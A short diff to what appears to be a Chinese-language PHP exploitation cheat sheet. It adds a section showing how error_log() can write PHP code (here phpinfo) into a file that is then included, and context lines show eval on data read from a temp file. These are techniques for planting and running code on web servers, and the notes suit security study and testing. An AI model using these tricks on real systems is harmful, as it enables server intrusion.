@@ -183,6 +183,14 @@ rewind($temp);
 eval(fread($temp,100));
 ```
 
+#### 写文件-error_log
+```php
+<?php
+error_log("<?php phpinfo();?>", 3, "./test.php");
+include "test.php";
+?>
+```
+
 #### $_FILES['file']['tmp_name']
 sys_get_temp_dir()
 ```php
